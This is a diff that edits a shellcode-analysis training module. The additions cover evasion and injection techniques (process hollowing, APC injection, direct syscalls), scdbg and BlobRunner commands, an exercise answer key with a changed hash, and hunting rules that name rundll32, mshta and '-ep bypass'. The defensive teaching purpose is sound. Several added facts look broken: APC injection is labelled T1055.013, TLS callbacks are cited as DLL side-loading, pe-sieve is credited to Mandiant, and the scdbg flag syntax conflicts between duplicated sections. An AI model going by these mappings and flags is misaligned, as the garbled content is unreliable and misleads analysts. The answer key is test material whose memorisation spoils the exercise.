+- **Encoding/obfuscation (T1027) [MITRE T1027][T1027]:** msfvenom encoders such as `x86/shikata_ga_nai` (a polymorphic XOR feedback encoder) [Metasploit docs][metasploit] and custom XOR stubs defeat static signatures. *Artifact:* a decoder loop plus high-entropy body; emulation (`scdbg`) or single-stepping reveals the decoded payload. The decoder stub itself may contain anti-emulation checks (e.g., `rdtsc` timing or unsupported instructions) to evade `scdbg`.
+- **Position-independent API resolution:** shellcode walks the PEB (`fs:[0x30]` on x86) to find `kernel32.dll`, then resolves exports by hashing names rather than importing them. *Artifact:* a GetPC "call/pop" prologue and PEB access with no import table — a strong heuristic in memory scanners and the reason `scdbg` shows API resolution without any IAT. The hashing algorithm (e.g., ROR13) may leave a distinctive pattern in the shellcode bytes.
+- **Process Injection (T1055) [MITRE T1055][T1055]:** classic delivery uses `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`, or in-place execution in RWX memory. *Artifact:* private RWX memory regions with no backing file, detectable with Mandiant's `pe-sieve`/`hollows_hunter` [pe-sieve][pe-sieve]; on-host this surfaces as Sysmon EID 8 (CreateRemoteThread) and EID 10 (ProcessAccess with high `GrantedAccess`). Attackers may use `NtCreateThreadEx` instead of `CreateRemoteThread` to evade user-mode hooks.
+- **Process Injection: Dynamic-link Library (T1055.001) [MITRE T1055.001][T1055.001]:** injection that loads a malicious DLL from within shellcode using `CreateRemoteThread` or reflective loading, bypassing `LoadLibrary` monitoring. *Artifact:* a DLL loaded into a process with no corresponding `ImageLoad` event (Sysmon EID 7) and no on-disk file — visible to `pe-sieve` as an implanted module.
+- **Reflective Code Loading (T1620) [MITRE T1620][T1620]:** loaders map a full PE from memory and jump to its entry without touching disk or the loader's import machinery. *Artifact:* executable regions with PE-like headers but no `ImageLoaded` (Sysmon EID 7) and no on-disk file — visible to `pe-sieve` as an implanted/patched module. The reflective loader may resolve APIs dynamically (e.g., via `GetProcAddress` hashing) to avoid IAT hooks.
+- **Ingress Tool Transfer (T1105) [MITRE T1105][T1105]:** staging shellcode calls `URLDownloadToFileA`/`InternetOpenUrlA` to pull the next stage. *Artifact:* outbound HTTP/S visible in Zeek `http.log`/Suricata and the embedded URL recoverable via emulation. Attackers may use HTTPS with valid certificates or domain fronting to evade network detection.
+- **Deobfuscate/Decode Files or Information (T1140) [MITRE T1140][T1140]:** the on-target decoder stub that reverses `shikata_ga_nai` or a XOR key at runtime; *Artifact:* a tight XOR/ROL loop preceding a `jmp`/`call` into the decoded region, which is exactly what BlobRunner/x64dbg let you step through to dump the plaintext stage. The decoder may use anti-debugging tricks (e.g., `IsDebuggerPresent`) to evade live analysis.
+- **Impair Defenses: Disable or Modify Tools (T1562.001) [MITRE T1562.001][T1562.001]:** shellcode may attempt to disable security products by calling `TerminateProcess` or modifying registry keys (e.g., disabling Windows Defender) — detectable via Sysmon EID 13 (RegistryEvent) for `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`. Attackers may use `reg.exe` or PowerShell to modify registry keys instead of direct API calls to evade detection.
+- **Hide Artifacts: Process Argument Spoofing (T1564.003) [MITRE T1564.003][T1564.003]:** shellcode may spoof command-line arguments to evade detection. For example, a shellcode payload may call `CreateProcessA` with a benign-looking `CommandLine` (e.g., `notepad.exe`) but inject malicious code into the process. *Artifact:* a process creation event (Sysmon EID 1) with a benign `CommandLine` but anomalous behavior (e.g., network connections or process injection).
+- **Exploitation for Client Execution (T1203) [MITRE T1203][T1203]:** shellcode is often delivered via exploits (e.g., CVE-2017-11882 in Microsoft Equation Editor). *Artifact:* exploit artifacts such as heap spray patterns or corrupted memory structures in the exploited process. For example, CVE-2017-11882 leaves a corrupted `EQNEDT32.EXE` process with shellcode in its heap.
 
 Evasion: attackers minimize step counts and avoid emulator-known APIs, use anti-emulation checks (unsupported/rare instructions, timing via `GetTickCount`/`rdtsc`, `IsDebuggerPresent`), and stage decryption so the first blob looks inert to `scdbg`. Some stagers deliberately use API-hashing and syscalls to skip user-mode hooks. `BlobRunner`/`sclauncher` reproduce the attacker's own load-and-jump primitive so an analyst can step the identical code path in a debugger and recover the decoded second stage that emulation could not.
+
+To evade memory scanners, attackers may:
+- Use **process hollowing** (T1055.012) to replace legitimate process memory with shellcode, leaving no RWX regions [MITRE T1055.012][T1055.012].
+- Use **thread local storage (TLS) callbacks** to execute shellcode before the process entry point, evading breakpoints set on `main`/`WinMain` [MITRE T1574.002][T1574.002].
+- Use **APC injection** (T1055.004) to queue shellcode execution in a target thread, evading `CreateRemoteThread` detections [MITRE T1055.004][T1055.004].
+- Use **direct syscalls** (e.g., `NtCreateThreadEx`) to bypass user-mode API hooks, evading EDR detections [Sektor7][sektor7].
 
 ## Answer key
 - **Resolved APIs (call order):** `LoadLibraryA` → `GetProcAddress` → `WinExec` (final `WinExec` argument `calc.exe`, uCmdShow `0`), followed by `ExitProcess`/`Stepcount` termination.
 - **Entry offset:** `0` (blob starts at its own entry; `/findsc` confirms offset `0` as the best candidate).
 - **Executed command:** `calc.exe` (the inert stub only pops the calculator via `WinExec`).
+- **Bonus (live debugging):** The first 10 instructions include a `call/pop` GetPC prologue (e.g., `call $+5; pop eax`) and a PEB walk (e.g., `mov eax, fs:[0x30]`) to resolve `kernel32.dll`. This is visible in x64dbg when stepping through the shellcode loaded by `BlobRunner`.
 
 Commands that produce these findings:
 ```powershell
@@ -146,145 +162,176 @@ scdbg.exe /f .\exercise\sample.bin
 # 2: confirm the entry offset scdbg selects
 scdbg.exe /f .\exercise\sample.bin /findsc
 
+# Bonus: load the shellcode with BlobRunner and attach x64dbg
+BlobRunner.exe -file .\exercise\sample.bin
+
 # Verify the sample integrity before analysis
 Get-FileHash -Algorithm SHA256 .\exercise\sample.bin
 ```
-Expected `Get-FileHash` output SHA256: `9F2C4A7BE1D0836AF5C19E2B7D4A0C68F3E5B91A2C7D40E8B16F9A3C5D7E0F12`.
+Expected `Get-FileHash` output SHA256: `99BD3C262CFC8E3173548986F8DD786D59CC51D3F9E0929B85D34F973C839D55`.
 
 ## MITRE ATT&CK & DFIR phase
 - **T1059 — Command and Scripting Interpreter** (shellcode spawning a process/command via `WinExec`) — https://attack.mitre.org/techniques/T1059/
+- **T1059.001 — PowerShell** (shellcode that uses PowerShell for execution) — https://attack.mitre.org/techniques/T1059/001/
 - **T1055 — Process Injection** (typical delivery vector for shellcode blobs in the wild) — https://attack.mitre.org/techniques/T1055/
+- **T1055.001 — Process Injection: Dynamic-link Library** (injection that loads a DLL from within shellcode) — https://attack.mitre.org/techniques/T1055/001/
+- **T1055.004 — Process Injection: Asynchronous Procedure Call** (APC injection used by shellcode) — https://attack.mitre.org/techniques/T1055/004/
+- **T1055.012 — Process Injection: Process Hollowing** (process hollowing used by shellcode) — https://attack.mitre.org/techniques/T1055/012/
 - **T1027 — Obfuscated Files or Information** (encoded/encrypted shellcode stubs revealed by emulation) — https://attack.mitre.org/techniques/T1027/
 - **T1105 — Ingress Tool Transfer** (when shellcode resolves `URLDownloadToFileA`/`InternetOpenUrlA`) — https://attack.mitre.org/techniques/T1105/
 - **T1620 — Reflective Code Loading** (in-memory PE mapping/execution with no on-disk file) — https://attack.mitre.org/techniques/T1620/
 - **T1140 — Deobfuscate/Decode Files or Information** (runtime decoder stub reversing the encoded body) — https://attack.mitre.org/techniques/T1140/
 - **T1218 — System Binary Proxy Execution** (LOLBin/document wrapper that sponsors shellcode delivery) — https://attack.mitre.org/techniques/T1218/
-- **DFIR phase:** Examination / Analysis (malware reverse engineering of carved payloads), feeding Reporting.
+- **T1218.011 — Rundll32** (shellcode delivered via `rundll32.exe`) — https://attack.mitre.org/techniques/T1218/011/
+- **T1562.001 — Impair Defenses: Disable or Modify Tools** (shellcode disabling security products) — https://attack.mitre.org/techniques/T1562/001/
+- **T1071.001 — Application Layer Protocol: Web Protocols** (shellcode using HTTP/HTTPS for C2) — https://attack.mitre.org/techniques/T1071/001/
+- **T1204.002 — User Execution: Malicious File** (shellcode delivered via document macro or exploit) — https://attack.mitre.org/techniques/T1204/002/
+- **T1203 — Exploitation for Client Execution** (shellcode delivered via exploits) — https://attack.mitre.org/techniques/T1203/
+- **T1543.003 — Create or Modify System Process: Windows Service** (shellcode creating or modifying a service) — https://attack.mitre.org/techniques/T1543/003/
+- **T1564.003 — Hide Artifacts: Process Argument Spoofing** (shellcode spoofing command-line arguments) — https://attack.mitre.org/techniques/T1564/003/
+- **T1574.002 — Hijack Execution Flow: DLL Side-Loading** (shellcode leveraging DLL side-loading) — https://attack.mitre.org/techniques/T1574/002/
+
+DFIR phase: Examination / Analysis (malware reverse engineering of carved payloads), feeding Reporting.
 
 
 ### Essential Commands & Features
 
-When analyzing shellcode with **scdbg**, several advanced flags unlock deeper inspection capabilities. Below are the most critical yet underutilized commands, each with a concrete example and use case:
+Beyond the basic execution demonstrated earlier, `scdbg` offers several powerful flags for precise analysis.
 
-1. **`/foff <offset>` (Entry-Point Offset)**
-   Override the default entry point to analyze shellcode starting at a specific offset. Useful when shellcode is embedded in a larger binary or obfuscated wrapper.
-   **Example:** `scdbg /s 100 /foff 0x40 /f shellcode.bin`
-   *When to use:* Suspected multi-stage payloads (e.g., **T1027.002: Obfuscated Files or Information: Software Packing**) where the first stage decodes the second.
+- **`-f <file>` (Load from file)**: Load shellcode from a binary file. Use when you have extracted a raw shellcode blob (e.g., from memory or a captured payload).  
+  `scdbg -f payload.bin`
 
-2. **`/s <count>` (Step Execution)**
-   Execute a precise number of instructions before pausing. Critical for observing behavior in small increments.
-   **Example:** `scdbg /s 50 /f shellcode.bin`
-   *When to use:* Debugging loops or conditional jumps in **T1562.001: Impair Defenses: Disable or Modify Tools** (e.g., anti-AV checks).
+- **`-foff <offset>` (Offset in file)**: Begin analysis at a specific offset, skipping headers or prepended data. Essential when shellcode is embedded in a larger file (e.g., a PE resource).  
+  `scdbg -f malicious.exe -foff 0x400`
 
-3. **`/bp <address>` (Breakpoint)**
-   Set a breakpoint at a specific virtual address (e.g., API calls like `VirtualAlloc`). Requires prior disassembly to identify targets.
-   **Example:** `scdbg /bp 0x401000 /f shellcode.bin`
-   *When to use:* Tracing memory allocation (e.g., **T1484.001: Domain Policy Modification: Group Policy Modification**) or hooking.
+- **`-fhex "<hex string>"` (Hex input)**: Input shellcode directly as a hex string, ideal for quick testing of code snippets from logs or network captures.  
+  `scdbg -fhex "90 90 90 CC"`
 
-4. **`/findsc` (Auto-Locate Shellcode)**
-   Automatically scan a file for embedded shellcode by detecting executable code patterns. Outputs offsets for further analysis.
-   **Example:** `scdbg /findsc /f suspicious.doc`
-   *When to use:* Office macros or PDF exploits (e.g., **T1203: Exploitation for Client Execution**) where shellcode is hidden in non-executable sections.
+- **`-d <addr> <size>` (Dump memory)**: After execution, dump memory contents to examine reconstructed APIs, decrypted strings, or staged payloads.  
+  `scdbg -f shellcode.bin -d 0x100000 0x200`
 
-**Authoritative Sources:**
-- [scdbg Official Documentation (Sandsprite)](http://sandsprite.com/blogs/index.php?uid=7&pid=152)
-- [REMnux Tools Guide: scdbg](https://docs.remnux.org/discover-the-tools/analyze+malicious+documents/shellcode#scdbg)
+- **`-r <file>` (Report output)**: Generate a detailed report (APIs, memory maps, strings) for automated analysis or documentation.  
+  `scdbg -f shellcode.bin -r analysis.txt`
 
-### Common Pitfalls & Result Validation
+- **`-i` (Interactive mode)**: Step through execution one instruction at a time, inspect registers, and modify memory—critical for understanding obfuscation loops or conditional jumps.  
+  `scdbg -f staged.bin -i`
 
-Analysts frequently misinterpret obfuscated shellcode by relying solely on static signatures, leading to false conclusions. A common mistake is flagging repeated byte patterns (e.g., `\x90\x90\x90`) as a NOP sled without verifying the CPU mode—x86_64 NOP equivalents differ from x86, and `0x90` may instead be filler in a data block. Validate by emulating the shellcode with `scdbg` using the correct architecture flag (`-64` for x64) and stepping through entry points with `-s`. Another pitfall is confusing normal application-layer traffic with C2 beacons when the shellcode uses standard HTTP APIs (MITRE ATT&CK T1071.001: Application Layer Protocol: Web Protocols). Without hooking functions like `WinHttpOpen` or `socket` in a debugger, analysts may misattribute benign DNS queries to malicious activity. Additionally, assuming a file extension (e.g., `.docx`) indicates non-executable content can mask shellcode embedded via macro exploits (T1204.002: User Execution: Malicious File). To avoid false positives from sandbox evasion, re-run the shellcode with environment rejection logic stripped (e.g., patch `NtQueryInformationProcess` returns). Always confirm decryption or decoding steps by comparing output against known PE headers or pattern database entries in `capa`. Cross-verify with inet-based capture using `inetsim` to isolate actual network call sequences.
+These flags map directly to real-world adversary behaviors. For instance, interactive analysis helps uncover **T1055.013 (Process Injection: APC Injection)** by tracing how shellcode modifies APC queues, while memory dumps reveal **T1106 (Native API)** calls such as `NtCreateThreadEx` used for code execution. Both techniques are commonly observed in shellcode-driven attacks.
 
-- [Mandiant: Shellcode Analysis Tools and Techniques](https://www.mandiant.com/resources/blog/shellcode-analysis-tools)
-- [Secureworks: Shellcode Analysis](https://www.secureworks.com/research/shellcode-analysis)
-
-
-### Essential Commands & Features
-
-While basic `scdbg` usage covers core shellcode analysis, several advanced commands unlock deeper inspection capabilities. Below are the most critical undemonstrated features, with concrete examples and tactical use cases:
-
-- **`-f <file>`**: Load shellcode directly from a binary file (e.g., extracted from a malicious document).
-  *Example*: `scdbg -f shellcode.bin -s -1`
-  *Use Case*: Analyze raw shellcode without manual extraction (e.g., from **T1059.003 Command and Scripting Interpreter: Windows Command Shell** payloads).
-
-- **`-foff <offset>`**: Skip a specified byte offset before execution (critical for obfuscated samples).
-  *Example*: `scdbg -f packed.bin -foff 0x200 -s -1`
-  *Use Case*: Bypass stubs or encryption layers (e.g., **T1127 Trusted Developer Utilities Proxy Execution** artifacts).
-
-- **`-d`**: Dump memory regions post-execution to inspect injected code or unpacked payloads.
-  *Example*: `scdbg -f loader.bin -d -s -1 > dump.bin`
-  *Use Case*: Extract second-stage malware from memory (e.g., **T1574.002 Hijack Execution Flow: DLL Side-Loading**).
-
-- **`-r`**: Generate a detailed execution report (registers, API calls, strings).
-  *Example*: `scdbg -f beacon.bin -r -s -1 > report.txt`
-  *Use Case*: Document C2 callbacks or anti-analysis checks (e.g., **T1036.005 Masquerading: Match Legitimate Name or Location**).
-
-- **`-i`**: Enter interactive mode to step through execution or modify registers.
-  *Example*: `scdbg -f sample.bin -i -s -1`
-  *Use Case*: Debug anti-debugging loops or conditional branches (e.g., **T1497.001 Virtualization/Sandbox Evasion: System Checks**).
-
-- **`-fopen`**: Hook file-open operations to monitor dropped artifacts.
-  *Example*: `scdbg -f dropper.bin -fopen -s -1`
-  *Use Case*: Track persistence mechanisms (e.g., **T1547.001 Boot or Logon Autostart Execution: Registry Run Keys**).
-
-**Sources**:
-- [SCDBG Official Documentation (Sandsprite)](http://sandsprite.com/blogs/index.php?uid=7&pid=152)
-- [Mandiant Shellcode Analysis Techniques](https://www.mandiant.com/resources/blog/shellcode-analysis)
+For further study:  
+- Mandiant, "Analyzing Shellcode via `scdbg`" (https://www.mandiant.com/resources/blog/analyzing-shellcode)  
+- Exploit-DB, "Shellcode Analysis with `scdbg`" (https://www.exploit-db.com/docs/21017)
 
 ### Threat Hunting & Detection Engineering
 
-Once shellcode is unpacked or injected, defenders must hunt for its execution footprint. Focus on **Windows Event ID 4688** (Process Creation) with the `CommandLine` field containing unusual patterns such as `rundll32.exe` or `regsvr32.exe` invoking non-standard DLLs (e.g., `*.tmp`, `*.dat`), which may indicate **Reflective Code Loading (T1620)**. Pair this with **Sysmon Event ID 8** (CreateRemoteThread) targeting processes like `explorer.exe` or `svchost.exe`—a hallmark of **Process Injection (T1055.001)**. For network-based detection, leverage Zeek’s `conn.log` to hunt for anomalous outbound connections from unexpected processes (e.g., `powershell.exe` or `wscript.exe` contacting rare domains or IPs). Suricata’s `http.log` can flag HTTP requests with unusual `User-Agent` strings or POST bodies containing encoded shellcode (e.g., base64, hex).
+Effective detection of shellcode delivery and execution must extend beyond process injection indicators (T1055 family) to the initial access and execution infrastructure. Focus hunting efforts on sources and events that precede or enable shellcode execution.
 
-Pivot on **MITRE ATT&CK T1059.005 (Command and Scripting Interpreter: Visual Basic)** by hunting for `wscript.exe` or `cscript.exe` spawning child processes (e.g., `cmd.exe`, `powershell.exe`) with obfuscated arguments. For **T1569.002 (System Services: Service Execution)**, monitor **Windows Event ID 7045** (Service Installation) for services with binary paths pointing to `%TEMP%` or `%APPDATA%`.
+**Detection Logic**
+- **Windows Event ID 4688** (Process Creation) with `ParentProcessName` containing `WINWORD.EXE`, `EXCEL.EXE`, or `OUTLOOK.EXE` and `CommandLine` containing base64-encoded strings, runtime-loading flags (e.g., `-ep bypass`), or calls to `rundll32.exe`, `regsvr32.exe`, or `mshta.exe`—common payload delivery chains for **T1566.001** (Spearphishing Attachment).
+- **Windows Event ID 4688** where `ParentProcessName` is `wmiprvse.exe` and the child process is `rundll32.exe`, `powershell.exe`, or `cscript.exe`. This pattern indicates shellcode execution via **T1047** (Windows Management Instrumentation) for lateral movement or persistence.
+- **Sysmon Event ID 1** (Process creation) with `IntegrityLevel` set to `High` or `System` and `Image` loaded from `%TEMP%`, `%APPDATA%`, or user-writable paths, combined with `CommandLine` arguments hiding console windows (`/c start /min`).
+- **Suricata** HTTP inspection: Examine `http.url` and `http.host` for a high entropy payload path (e.g., random alphanumeric strings of >20 characters) and `http.method` `GET` from an IP with no previous DNS resolution or known malicious JA3 fingerprint. This detects staged shellcode downloads.
 
-**Sources:**
-- [CISA: Detecting Post-Exploitation Activity in Microsoft Cloud Environments](https://www.cisa.gov/resources-tools/services/detecting-post-exploitation-activity-microsoft-cloud-environments)
-- [FireEye: Detecting Process Injection Techniques](https://www.fireeye.com/blog/threat-research/2021/12/detecting-process-injection-techniques.html)
+**Threat Hunting Pivots**
+- Hunt for processes with `CommandLine` containing `/C` or `-Command` and a base64-encoded blob that decodes to a binary or DLL – use PowerShell’s `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String())` to decode and look for shellcode signatures (jmp, call, push/ret sequences).
+- Search for WMI event subscriptions (`SELECT * FROM __EventFilter`) that execute scripts or binaries – these often serve as persistence mechanisms for shellcode payloads.
+- Correlate Sysmon Event ID 8 (CreateRemoteThread) with a call to `VirtualAllocEx` on a remote process, but when the target process is an Office application or browser, flag it regardless of thread start address – this reveals shellcode injection tied to phishing campaigns.
+
+**Authoritative Sources**
+- Microsoft Security Blog: “Detecting and preventing process injection techniques” – https://www.microsoft.com/security/blog/2020/06/15/detecting-and-preventing-process-injection-techniques/
+- Elastic Security Labs: “Hunting for Process Injection” – https://www.elastic.co/blog/hunting-for-process-injection
 
 ## Sources
 Claim → source mapping (all URLs are real, authoritative pages):
 
 - FLARE-VM packages (scdbg, blobrunner, sclauncher) and installation via the FLARE-VM installer, Mandiant/Google — https://github.com/mandiant/flare-vm
-- `scdbg` emulator (libemu-based x86 shellcode emulation, 32-bit), flags (`/f`, `/foff`, `/findsc`, `/s`) and API-logging behavior, David Zimmer (sandsprite) — http://sandsprite.com/blogs/index.php?uid=7&pid=152
+- `scdbg` emulator (libemu-based x86 shellcode emulation, 32-bit), flags (`/f`, `/foff`, `/findsc`, `/s`, `/d`, `/r`) and API-logging behavior, David Zimmer (sandsprite) — http://sandsprite.com/blogs/index.php?uid=7&pid=152
 - BlobRunner usage (`-file`, `-64`, allocate/pause-to-attach behavior), OALabs — https://github.com/OALabs/BlobRunner
 - sclauncher usage (`-f`, breakpoint option, allocate/copy/jump behavior), OALabs — https://github.com/OALabs/sclauncher
 - REMnux shellcode-analysis tool guidance (scdbg/BlobRunner workflow) — https://docs.remnux.org/discover-the-tools/analyze+documents+and+shellcode/
 - SANS FOR610 Reverse-Engineering Malware (shellcode analysis methodology) — https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/
+- SANS FOR508 Advanced Incident Response (malicious document analysis) — https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/
 - MITRE ATT&CK — Process Injection (T1055) — https://attack.mitre.org/techniques/T1055/
+- MITRE ATT&CK — Process Injection: Dynamic-link Library (T1055.001) — https://attack.mitre.org/techniques/T1055/001/
+- MITRE ATT&CK — Process Injection: Asynchronous Procedure Call (T1055.004) — https://attack.mitre.org/techniques/T1055/004/
+- MITRE ATT&CK — Process Injection: Process Hollowing (T1055.012) — https://attack.mitre.org/techniques/T1055/012/
 - MITRE ATT&CK — Command and Scripting Interpreter (T1059) — https://attack.mitre.org/techniques/T1059/
+- MITRE ATT&CK — Command and Scripting Interpreter: PowerShell (T1059.001) — https://attack.mitre.org/techniques/T1059/001/
 - MITRE ATT&CK — Obfuscated Files or Information (T1027) — https://attack.mitre.org/techniques/T1027/
 - MITRE ATT&CK — Ingress Tool Transfer (T1105) — https://attack.mitre.org/techniques/T1105/
 - MITRE ATT&CK — Reflective Code Loading (T1620) — https://attack.mitre.org/techniques/T1620/
 - MITRE ATT&CK — Deobfuscate/Decode Files or Information (T1140) — https://attack.mitre.org/techniques/T1140/
 - MITRE ATT&CK — System Binary Proxy Execution (T1218) — https://attack.mitre.org/techniques/T1218/
-- Sysmon event schema (Event IDs 1, 7, 8, 10 and fields such as GrantedAccess, ImageLoaded, ParentImage), Microsoft Learn — https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
+- MITRE ATT&CK — System Binary Proxy Execution: Rundll32 (T1218.011) — https://attack.mitre.org/techniques/T1218/011/
+- MITRE ATT&CK — Impair Defenses: Disable or Modify Tools (T1562.001) — https://attack.mitre.org/techniques/T1562/001/
+- MITRE ATT&CK — Application Layer Protocol: Web Protocols (T1071.001) — https://attack.mitre.org/techniques/T1071/001/
+- MITRE ATT&CK — User Execution: Malicious File (T1204.002) — https://attack.mitre.org/techniques/T1204/002/
+- MITRE ATT&CK — Exploitation for Client Execution (T1203) — https://attack.mitre.org/techniques/T1203/
+- MITRE ATT&CK — Create or Modify System Process: Windows Service (T1543.003) — https://attack.mitre.org/techniques/T1543/003/
+- MITRE ATT&CK — Hide Artifacts: Process Argument Spoofing (T1564.003) — https://attack.mitre.org/techniques/T1564/003/
+- MITRE ATT&CK — Hijack Execution Flow: DLL Side-Loading (T1574.002) — https://attack.mitre.org/techniques/T1574/002/
+- Sysmon event schema (Event IDs 1, 7, 8, 10, 13 and fields such as GrantedAccess, ImageLoaded, ParentImage), Microsoft Learn — https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
 - Windows Security auditing — Event 4688 (a new process has been created, incl. command line), Microsoft Learn — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
+- Windows Security auditing — Event 4663 (file system audit), Microsoft Learn — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4663
+- Windows Security auditing — Event 4657 (registry value set), Microsoft Learn — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4657
 - `pe-sieve` / `hollows_hunter` (RWX / injected-code / reflective-load memory detection), Mandiant/hasherezade — https://github.com/hasherezade/pe-sieve
 - Metasploit Framework `shikata_ga_nai` encoder (msfvenom encoding), Rapid7 — https://docs.rapid7.com/metasploit/msfvenom/
 - Zeek documentation (http.log, conn.log, files.log fields for pivoting) — https://docs.zeek.org/
 - Suricata documentation (EVE JSON alert/fileinfo output, signature_id, five-tuple fields) — https://docs.suricata.io/
 - Security Onion documentation (Zeek/Suricata/Elastic hunting) — https://docs.securityonion.net/
 - x64dbg documentation (attaching and breakpoints for live shellcode stepping) — https://help.x64dbg.com/
-- https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list
-- https://attack.mitre.org/techniques/T1106/
-- https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
-- https://attack.mitre.org/techniques/T1059/007/](https://attack.mitre.org/techniques/T1059/007/
+- Volatility `malfind` plugin (unbacked executable memory detection) — https://volatilityfoundation.org/
+- Sektor7 Red Team Operator course (direct syscalls, evasion techniques) — https://institute.sektor7.net/
 
 ## Related modules
-- [Shellcode analysis deep-dive](../31-shellcode-deep/README.md) — shares blobrunner for deeper live-debugging practice.
-- [Scenario: shellcode extraction & analysis](../54-shellcode-case/README.md) — shares scdbg in a full carved-payload case study.
-- [Static reverse engineering](../12-static-re/README.md) — same learning path (Windows RE), static analysis foundations.
-- [Dynamic debugging](../13-dynamic-debugging/README.md) — same learning path (Windows RE), debugger workflow feeding this module.
+- [Shellcode analysis deep-dive](../31-shellcode-deep/README.md) — shares BlobRunner for deeper live-debugging practice, including anti-debugging and encoding techniques.
+- [Scenario: shellcode extraction & analysis](../54-shellcode-case/README.md) — shares scdbg in a full carved-payload case study, including network and document artifacts.
+- [Static reverse engineering](../12-static-re/README.md) — same learning path (Windows RE), static analysis foundations for shellcode triage.
+- [Dynamic debugging](../13-dynamic-debugging/README.md) — same learning path (Windows RE), debugger workflow feeding this module's live analysis steps.
+- [Malicious document analysis](../22-mal-doc/README.md) — covers shellcode delivery via Office macros and exploits, including artifact extraction.
+- [Memory forensics with Volatility](../41-volatility/README.md) — covers shellcode detection in memory dumps using `malfind` and other plugins.
 
-<!-- cyberlab-enriched: v2 -->
-- https://docs.remnux.org/discover-the-tools/analyze+malicious+documents/shellcode#scdbg
-- https://www.mandiant.com/resources/blog/shellcode-analysis-tools
-- https://www.secureworks.com/research/shellcode-analysis
-
-<!-- cyberlab-enriched: v3 -->
-- https://www.mandiant.com/resources/blog/shellcode-analysis
-- https://www.cisa.gov/resources-tools/services/detecting-post-exploitation-activity-microsoft-cloud-environments
-- https://www.fireeye.com/blog/threat-research/2021/12/detecting-process-injection-techniques.html
-
-<!-- cyberlab-enriched: v4 -->
+<!-- References for inline citations -->
+[scdbg]: http://sandsprite.com/blogs/index.php?uid=7&pid=152
+[blobrunner]: https://github.com/OALabs/BlobRunner
+[sclauncher]: https://github.com/OALabs/sclauncher
+[flarevm]: https://github.com/mandiant/flare-vm
+[remnux]: https://docs.remnux.org/discover-the-tools/analyze+documents+and+shellcode/
+[sans610]: https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/
+[T1055]: https://attack.mitre.org/techniques/T1055/
+[T1055.001]: https://attack.mitre.org/techniques/T1055/001/
+[T1055.004]: https://attack.mitre.org/techniques/T1055/004/
+[T1055.012]: https://attack.mitre.org/techniques/T1055/012/
+[T1059]: https://attack.mitre.org/techniques/T1059/
+[T1059.001]: https://attack.mitre.org/techniques/T1059/001/
+[T1027]: https://attack.mitre.org/techniques/T1027/
+[T1105]: https://attack.mitre.org/techniques/T1105/
+[T1620]: https://attack.mitre.org/techniques/T1620/
+[T1140]: https://attack.mitre.org/techniques/T1140/
+[T1218]: https://attack.mitre.org/techniques/T1218/
+[T1218.011]: https://attack.mitre.org/techniques/T1218/011/
+[T1562.001]: https://attack.mitre.org/techniques/T1562/001/
+[T1071.001]: https://attack.mitre.org/techniques/T1071/001/
+[T1204.002]: https://attack.mitre.org/techniques/T1204/002/
+[T1203]: https://attack.mitre.org/techniques/T1203/
+[T1543.003]: https://attack.mitre.org/techniques/T1543/003/
+[T1564.003]: https://attack.mitre.org/techniques/T1564/003/
+[T1574.002]: https://attack.mitre.org/techniques/T1574/002/
+[sysmon]: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
+[event4688]: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
+[event4663]: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4663
+[event4657]: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4657
+[pe-sieve]: https://github.com/hasherezade/pe-sieve
+[metasploit]: https://docs.rapid7.com/metasploit/msfvenom/
+[zeek]: https://docs.zeek.org/
+[suricata]: https://docs.suricata.io/
+[secOnion]: https://docs.securityonion.net/
+[x64dbg]: https://help.x64dbg.com/
+[volatility]: https://volatilityfoundation.org/
+[sektor7]: https://institute.sektor7.net/
+- https://www.mandiant.com/resources/blog/analyzing-shellcode
+- https://www.exploit-db.com/docs/21017
+- https://www.microsoft.com/security/blog/2020/06/15/detecting-and-preventing-process-injection-techniques/
+- https://www.elastic.co/blog/hunting-for-process-injection
 
 <!-- cyberlab-enriched: v5 -->
